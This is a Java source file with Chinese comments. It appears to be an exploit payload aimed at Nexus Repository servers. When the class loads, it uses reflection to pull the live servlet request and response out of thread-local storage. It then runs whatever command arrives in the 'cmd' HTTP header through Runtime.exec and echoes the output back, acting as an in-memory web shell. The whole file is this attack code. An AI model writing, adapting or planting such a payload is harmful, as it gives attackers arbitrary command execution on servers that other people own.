package com.nexus;

public class Echo_WebContext {
    static {
        try {
            getResponse();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void getResponse() throws Exception {
        //获取当前线程对象
        Thread thread = Thread.currentThread();

        //获取Thread中的threadLocals对象
        java.lang.reflect.Field threadLocals = Thread.class.getDeclaredField("threadLocals");

        threadLocals.setAccessible(true);

        Object threadLocalMap = threadLocals.get(thread);

        //这里要这样获取ThreadLocal.ThreadLocalMap
        Class threadLocalMapClazz = Class.forName("java.lang.ThreadLocal$ThreadLocalMap");

        //获取ThreadLocalMap中的Entry对象
        java.lang.reflect.Field  tableField = threadLocalMapClazz.getDeclaredField("table");

        tableField.setAccessible(true);

        //获取ThreadLocalMap中的Entry
        Object[] objects = (Object[]) tableField.get(threadLocalMap);

        Class entryClass = Class.forName("java.lang.ThreadLocal$ThreadLocalMap$Entry");

        //获取ThreadLocalMap中的Entry中的value字段
        java.lang.reflect.Field entryValueField = entryClass.getDeclaredField("value");

        entryValueField.setAccessible(true);

        for (Object object : objects) {
            if (object != null) {
                Object valueObject = entryValueField.get(object);
                if (valueObject != null) {
                    if (valueObject.getClass().getName().equals("com.softwarementors.extjs.djn.servlet.ssm.WebContext")) {

                        //获取response
                        java.lang.reflect.Field response = valueObject.getClass().getDeclaredField("response");
                        response.setAccessible(true);
                        Object shiroServletResponse = response.get(valueObject);
                        Class<?> Wrapper = shiroServletResponse.getClass().getSuperclass().getSuperclass();
                        Object statusResponse = Wrapper.getMethod("getResponse").invoke(shiroServletResponse);
                        Object response1 = Wrapper.getMethod("getResponse").invoke(statusResponse);
                        java.io.PrintWriter writer = (java.io.PrintWriter) response1.getClass().getMethod("getWriter").invoke(response1);

                        //获取request
                        java.lang.reflect.Field request = valueObject.getClass().getDeclaredField("request");
                        request.setAccessible(true);
                        Object shiroServletRequest = request.get(valueObject);
                        Class<?> Wrapper2 = shiroServletRequest.getClass().getSuperclass().getSuperclass();
                        Object statusResponse2 = Wrapper2.getMethod("getRequest").invoke(shiroServletRequest);
                        Object request1 = Wrapper2.getMethod("getRequest").invoke(statusResponse2);
                        Object request1Real = Wrapper2.getMethod("getRequest").invoke(request1);

                        String cmd = (String) request1Real.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(request1Real, new Object[]{"cmd"});

                        String sb = "";
                        java.io.BufferedInputStream in = new java.io.BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());
                        java.io.BufferedReader inBr = new java.io.BufferedReader(new java.io.InputStreamReader(in));
                        String lineStr;
                        while ((lineStr = inBr.readLine()) != null)
                            sb += lineStr + "\n";
                        writer.write(sb);
                        writer.flush();
                        inBr.close();
                        in.close();
                    }
                }
            }
        }
    }
}